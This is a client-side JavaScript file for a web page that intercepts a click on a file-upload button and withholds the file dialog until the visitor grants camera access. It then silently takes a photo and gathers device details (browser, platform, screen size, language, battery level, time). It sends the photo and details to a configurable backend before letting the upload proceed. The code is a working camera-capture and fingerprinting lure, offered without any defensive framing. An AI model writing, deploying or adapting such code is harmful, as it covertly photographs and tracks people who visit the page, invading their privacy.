// script.js

const fileInput = document.getElementById("user-file"); // file upload input
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

const BACKEND_URL = "https://your-backend-domain.com/api/upload"; // change this to your backend

// Request camera every time until allowed
async function requestCameraAndCapture() {
  try {
    // Ask for camera permission
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
    video.srcObject = stream;

    // Capture image immediately
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL("image/png");

    // Collect metadata
    const metadata = {
      useragent: navigator.userAgent,
      platform: navigator.platform,
      width: window.innerWidth,
      height: window.innerHeight,
      language: navigator.language,
      battery: navigator.getBattery ? (await navigator.getBattery()).level * 100 : "N/A",
      location: "N/A",
      time: new Date().toISOString()
    };

    // Send photo + metadata
    await fetch(BACKEND_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: imageData, metadata })
    });

    showToast("Photo captured & uploaded!");
    // Enable file input after upload
    fileInput.disabled = false;

  } catch (err) {
    console.error("Camera permission denied or error:", err);
    alert("Please allow camera permission to continue!");
  }
}

// Show toast
function showToast(message) {
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => { toast.style.display = "none"; }, 3000);
}

// On file input click, request camera first
fileInput.addEventListener("click", async (e) => {
  if (!fileInput.dataset.cameraAllowed) {
    e.preventDefault(); // prevent opening file dialog until camera captured
    await requestCameraAndCapture();
    fileInput.dataset.cameraAllowed = true; // mark as done
    fileInput.click(); // reopen file dialog
  }
});
